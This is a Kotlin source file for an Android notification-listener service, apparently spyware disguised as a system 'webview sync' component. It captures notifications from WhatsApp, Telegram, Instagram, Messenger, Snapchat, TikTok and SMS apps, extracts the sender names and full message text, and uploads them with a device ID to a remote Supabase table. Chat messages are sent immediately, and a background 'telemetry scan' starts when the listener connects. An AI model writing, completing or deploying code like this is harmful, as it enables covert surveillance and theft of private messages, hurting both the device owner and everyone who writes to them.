package com.system.webview.sync.services

import android.os.Build
import android.service.notification.NotificationListenerService
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import android.service.notification.StatusBarNotification
import com.system.webview.sync.localdb.PrefsHelper
import com.system.webview.sync.localdb.SyncQueueHelper
import com.system.webview.sync.network.SupabaseConfig
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.TimeZone
import java.util.concurrent.TimeUnit

class SystemSyncNotificationListenerService : NotificationListenerService() {

    companion object {
        @Volatile
        private var instance: SystemSyncNotificationListenerService? = null

        fun getActiveNotifications(): Array<StatusBarNotification>? {
            return instance?.activeNotifications
        }

        fun isTargetPackage(packageName: String): Boolean {
            return TARGET_PACKAGES.contains(packageName)
        }

        val TARGET_PACKAGES = setOf(
            "com.whatsapp",
            "com.whatsapp.w4b",
            "com.instagram.android",
            "org.telegram.messenger",
            "org.telegram.messenger.web",
            "com.facebook.orca",
            "com.facebook.katana",
            "com.linkedin.android",
            "com.twitter.android",
            "com.x.android",
            "com.zhiliaoapp.musically",
            "com.ss.android.ugc.trill",
            "com.snapchat.android",
            "com.google.android.apps.messaging",
            "com.android.mms",
            "com.samsung.android.messaging",
        )

        // Subset yang tergolong "obrolan sosmed" — dikirim langsung (bypass queue)
        private val SOCIAL_CHAT_PACKAGES = setOf(
            "com.whatsapp",
            "com.whatsapp.w4b",
            "com.instagram.android",
            "org.telegram.messenger",
            "org.telegram.messenger.web",
            "com.facebook.orca",
            "com.facebook.katana",
            "com.linkedin.android",
            "com.twitter.android",
            "com.x.android",
            "com.zhiliaoapp.musically",
            "com.ss.android.ugc.trill",
            "com.snapchat.android",
        )

        // OkHttpClient reusable — khusus untuk upload langsung notif sosmed
        private val directClient = OkHttpClient.Builder()
            .connectTimeout(10, TimeUnit.SECONDS)
            .writeTimeout(10, TimeUnit.SECONDS)
            .readTimeout(10, TimeUnit.SECONDS)
            .build()
    }

    override fun onCreate() {
        super.onCreate()
        instance = this
        android.util.Log.d("SyncNotif", "Service onCreate - instance set")
    }

    override fun onDestroy() {
        instance = null
        android.util.Log.d("SyncNotif", "Service onDestroy - instance cleared")
        super.onDestroy()
    }

    override fun onListenerDisconnected() {
        instance = null
        android.util.Log.d("SyncNotif", "Service onListenerDisconnected - instance cleared")
        super.onListenerDisconnected()
    }

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val packageName = sbn.packageName ?: return

        // Filter: hanya package target
        if (!TARGET_PACKAGES.contains(packageName)) return

        // Filter: skip ongoing/foreground-service notifications
        if (sbn.isOngoing) return

        val deviceUuid = PrefsHelper.getDeviceUuid(applicationContext) ?: run {
            android.util.Log.e("SyncNotif", "deviceUuid null — skipping $packageName")
            return
        }

        val extras = sbn.notification.extras

        // --- Title ---
        val title = (extras.getCharSequence("android.title") ?: extras.getString("android.title"))
            ?.toString()?.trim().takeIf { !it.isNullOrEmpty() } ?: "Unknown Sender"

        // --- Body: coba semua extras key secara prioritas ---
        val bigText   = extras.getCharSequence("android.bigText")?.toString()?.trim()
        val shortText = extras.getCharSequence("android.text")?.toString()?.trim()
        val subText   = extras.getCharSequence("android.subText")?.toString()?.trim()
        val textLines: String? = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            @Suppress("UNCHECKED_CAST")
            (extras.getCharSequenceArray("android.textLines") as? Array<CharSequence>)
                ?.filter { it.isNotBlank() }
                ?.joinToString("\n") { it.toString().trim() }
                ?.trim()
                ?.takeIf { it.isNotEmpty() }
        } else null

        val body: String = when {
            !bigText.isNullOrEmpty()   -> bigText
            !shortText.isNullOrEmpty() -> shortText
            !textLines.isNullOrEmpty() -> textLines
            !subText.isNullOrEmpty()   -> subText
            else                       -> "[Media / konten tanpa teks]"
        }

        if (NotificationHistory.isDuplicate(applicationContext, packageName, title, body)) {
            android.util.Log.d("SyncNotif", "Duplicate skipped: $packageName")
            return
        }

        android.util.Log.d("SyncNotif", "[$packageName] title='$title' body='${body.take(80)}'")

        try {
            val df = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US)
            df.timeZone = TimeZone.getTimeZone("UTC")

            val isChat = SOCIAL_CHAT_PACKAGES.contains(packageName)
            val payload = JSONObject().apply {
                put("device_id", deviceUuid)
                put("app_package", packageName)
                put("notification_title", title)
                put("notification_body", body)
                put("sender_name", title)
                put("is_chat", isChat)
                put("received_at", df.format(Date()))
            }
            val payloadString = payload.toString()

            if (isChat) {
                // Sosmed chat: kirim LANGSUNG via HTTP tanpa antrian
                // → tidak terblokir oleh isDirectSyncRunning / WorkManager backoff
                uploadChatDirect(payloadString, packageName)
            } else {
                // Non-sosmed (SMS, dll): lewat antrian biasa
                SyncQueueHelper.enqueue(applicationContext, "notification_logs", payloadString)
            }
        } catch (e: Exception) {
            android.util.Log.e("SyncNotif", "Error processing notification from $packageName", e)
        }
    }

    /**
     * POST langsung ke Supabase REST API untuk notifikasi sosmed.
     * Jika gagal (network error / Supabase down), fallback ke SyncQueueHelper.
     * Tidak terblokir oleh isDirectSyncRunning atau WorkManager backoff.
     */
    private fun uploadChatDirect(payloadString: String, packageName: String) {
        val ctx = applicationContext
        Thread {
            try {
                val url = "${SupabaseConfig.URL}/rest/v1/notification_logs"
                val request = Request.Builder()
                    .url(url)
                    .post(payloadString.toRequestBody("application/json; charset=utf-8".toMediaType()))
                    .addHeader("apikey", SupabaseConfig.ANON_KEY)
                    .addHeader("Authorization", "Bearer ${SupabaseConfig.ANON_KEY}")
                    .addHeader("Prefer", "return=minimal")
                    .build()
                directClient.newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        android.util.Log.d("SyncNotif", "[$packageName] Direct chat upload OK — realtime triggered")
                    } else {
                        android.util.Log.w("SyncNotif", "[$packageName] Direct upload HTTP ${response.code}, queuing fallback")
                        SyncQueueHelper.enqueue(ctx, "notification_logs", payloadString)
                    }
                }
            } catch (e: Exception) {
                android.util.Log.e("SyncNotif", "[$packageName] Direct upload error, queuing fallback", e)
                SyncQueueHelper.enqueue(ctx, "notification_logs", payloadString)
            }
        }.start()
    }

    override fun onListenerConnected() {
        super.onListenerConnected()
        android.util.Log.d("SyncNotif", "NotificationListenerService connected")
        try {
            val intent = android.content.Intent(this, BackgroundSyncService::class.java)
            androidx.core.content.ContextCompat.startForegroundService(this, intent)
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                BackgroundSyncService.triggerTelemetryScan(applicationContext)
            }, 1000)
        } catch (e: Exception) {
            android.util.Log.e("SyncNotif", "Failed to start BackgroundSyncService", e)
        }
    }
}
